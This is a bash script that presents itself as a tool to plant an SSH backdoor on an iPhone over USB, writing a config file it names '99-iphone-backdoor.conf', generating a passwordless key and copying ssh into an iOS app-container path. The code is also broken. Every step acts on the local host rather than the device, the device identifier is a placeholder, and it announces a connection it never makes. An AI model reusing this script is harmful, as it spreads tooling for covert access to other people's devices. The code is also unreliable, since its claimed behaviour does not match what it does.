#!/bin/bash

set -euo pipefail

# Function to compile libimobiledevice
compile_libimobiledevice() {
    cd "$(mktemp -d)" || exit
    
    git clone https://github.com/libimobiledevice/libimobiledevice.git
    cd libimobiledevice || exit
    
    ./autogen.sh
    make
    sudo make install
    sudo ldconfig
    
    cd -
}

# Function to connect to the Apple device
connect_to_device() {
    unique_identifier="unique-identifier-placeholder"  # Replace with actual retrieval logic
    
    user_home="/var/mobile/Containers/Data/Application/$unique_identifier"
    ssh_binary_path="$user_home/ssh"
    launch_daemon_path="/Library/LaunchDaemons/com.example.ssh.plist"
    ssh_key_path="$user_home/id_rsa"
    ssh_config_dir="/etc/ssh/sshd_config.d"
    ssh_config_file="$ssh_config_dir/99-iphone-backdoor.conf"
    
    defaults write /var/mobile/Library/Preferences/com.apple.mobile.installation.plist userhome_uid 501
    
    mkdir -p "$user_home"
    cp /usr/bin/ssh "$ssh_binary_path"
    chmod +x "$ssh_binary_path"
    
    # Note: This launch daemon logic is specific to macOS. You may not need this on Kali.
    # Consider removing or adjusting based on your actual usage.
    
    # Load the launch daemon - remove this on Kali as it's not applicable
    # launchctl load -w "$launch_daemon_path"
    
    ssh-keygen -t rsa -b 4096 -f "$ssh_key_path" -N ""
    
    mkdir -p "$ssh_config_dir"
    cat << EOF > "$ssh_config_file"
PasswordAuthentication no
EOF

    if ! grep -qxF 'Include /etc/ssh/sshd_config.d/*.conf' /etc/ssh/sshd_config; then
        echo "Include /etc/ssh/sshd_config.d/*.conf" >> /etc/ssh/sshd_config
    fi

    sudo systemctl restart ssh
}

# Function to monitor USB connections for the Apple device
monitor_usb_connections() {
    while true; do
        connected_devices=$(idevice_id -l | wc -l)
        if [ "$connected_devices" -gt 0 ]; then
            echo "iPhone connected. Establishing SSH connection..."
            connect_to_device
            echo "SSH connection established successfully."
            break
        fi
        sleep 5
    done
}

# Function to display usage
usage() {
    echo "Usage: sudo $0 --h"
    echo "Options:"
    echo "  --h       Display this help message"
    exit 1
}

# Function for error handling and logging
handle_error() {
    echo "Error: $1"
    echo "$(date): Error - $1" >> "$log_file"
    exit 1
}

# Function to set up logging
setup_logging() {
    log_file="/var/log/iphone_ssh.log"
    touch "$log_file" || handle_error "Failed to create log file."
    echo "$(date): Starting iPhone SSH script" >> "$log_file"
}

# Check if script is executed as root
if [ "$EUID" -ne 0 ]; then
    echo "Please run this script as root."
    exit 1
fi

# Parse command line options
while [[ $# -gt 0 ]]; do
    case $1 in
        --h)
            usage
            ;;
        *)
            echo "Invalid option: $1"
            usage
            ;;
    esac
done

# Main script starts here
setup_logging

if ! command -v idevice_id &>/dev/null; then
    echo "Compiling libimobiledevice..."
    compile_libimobiledevice || handle_error "Failed to compile libimobiledevice."
    echo "libimobiledevice compiled successfully."
fi

monitor_usb_connections

echo "$(date): iPhone SSH script completed successfully." >> "$log_file"
exit 0